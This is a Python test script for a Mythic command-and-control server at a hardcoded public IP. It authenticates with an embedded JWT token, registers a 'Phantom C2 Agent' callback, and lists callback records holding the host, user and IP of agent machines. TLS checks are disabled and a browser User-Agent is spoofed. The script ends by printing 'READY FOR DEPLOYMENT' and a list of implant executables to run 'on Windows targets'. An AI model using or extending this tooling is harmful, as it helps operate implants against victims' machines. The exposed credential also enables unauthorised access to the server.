#!/usr/bin/env python3
"""
Test the final Phantom payload with JWT authentication
"""

import requests
import json
import urllib3
from urllib3.exceptions import InsecureRequestWarning

urllib3.disable_warnings(InsecureRequestWarning)

MYTHIC_URL = "https://37.27.249.191:7443"
GRAPHQL_ENDPOINT = "/graphql/"
JWT_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NTAxMTExMDUsImlhdCI6MTc1MDA5NjcwNSwidXNlcl9pZCI6MSwiYXV0aCI6ImFwaSIsImV2ZW50c3RlcGluc3RhbmNlX2lkIjowLCJhcGl0b2tlbnNfaWQiOjcsIm9wZXJhdGlvbl9pZCI6MH0.3VtxYzD2_mGCV4NbggbmNXpq2tEfjvwnRypraq_yBlw"

def test_createCallback():
    """Test the createCallback mutation with exact payload format"""
    url = f"{MYTHIC_URL}{GRAPHQL_ENDPOINT}"
    
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {JWT_TOKEN}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    
    query = {
        "query": """
        mutation createCallback(
            $ip: String!,
            $host: String!,
            $user: String!,
            $os: String!,
            $architecture: String!,
            $agent_callback_id: String!,
            $description: String!
        ) {
            createCallback(
                ip: $ip,
                host: $host,
                user: $user,
                os: $os,
                architecture: $architecture,
                agent_callback_id: $agent_callback_id,
                description: $description
            ) {
                status
                error
            }
        }
        """,
        "variables": {
            "ip": "127.0.0.1",
            "host": "test-phantom-host",
            "user": "phantom-user",
            "os": "windows",
            "architecture": "amd64",
            "agent_callback_id": "phantom-1734375029-test",
            "description": "Phantom C2 Agent Test"
        }
    }
    
    try:
        response = requests.post(url, headers=headers, json=query, verify=False, timeout=10)
        print(f"createCallback Test")
        print(f"Status: {response.status_code}")
        print(f"Response: {response.text}")
        
        if response.status_code == 200:
            data = response.json()
            if "errors" not in data:
                print("✓ createCallback mutation working!")
                return True
            else:
                print(f"GraphQL errors: {data['errors']}")
        
        return False
    except Exception as e:
        print(f"Error: {e}")
        return False

def test_callback_query():
    """Test querying callbacks"""
    url = f"{MYTHIC_URL}{GRAPHQL_ENDPOINT}"
    
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {JWT_TOKEN}",
    }
    
    query = {
        "query": """
        {
            callback {
                id
                agent_callback_id
                host
                user
                ip
                os
                architecture
                description
                active
                last_checkin
            }
        }
        """
    }
    
    try:
        response = requests.post(url, headers=headers, json=query, verify=False, timeout=10)
        print(f"\nCallback Query Test")
        print(f"Status: {response.status_code}")
        print(f"Response: {response.text[:500]}...")
        
        if response.status_code == 200:
            data = response.json()
            if "data" in data and "callback" in data["data"]:
                callbacks = data["data"]["callback"]
                print(f"Found {len(callbacks)} callbacks")
                return True
        
        return False
    except Exception as e:
        print(f"Error: {e}")
        return False

def main():
    print("Testing Final Phantom Payload Configuration")
    print("=" * 60)
    
    print("1. Testing createCallback mutation...")
    create_ok = test_createCallback()
    
    print("\n2. Testing callback query...")
    query_ok = test_callback_query()
    
    print("\n" + "=" * 60)
    print("FINAL RESULTS:")
    print(f"Callback Creation: {'✓' if create_ok else '✗'}")
    print(f"Callback Query: {'✓' if query_ok else '✗'}")
    
    if create_ok and query_ok:
        print("\n🎯 READY FOR DEPLOYMENT!")
        print("✓ JWT token is valid")
        print("✓ GraphQL endpoints working")
        print("✓ Phantom payloads should connect successfully")
        print("\nExecute these payloads on Windows targets:")
        print("- phantom_jwt_updated_x64.exe")
        print("- phantom_jwt_x64.exe") 
        print("- phantom_jwt_x32.exe")
    else:
        print("\n❌ Configuration issues detected")
        print("Check GraphQL schema or token permissions")

if __name__ == "__main__":
    main()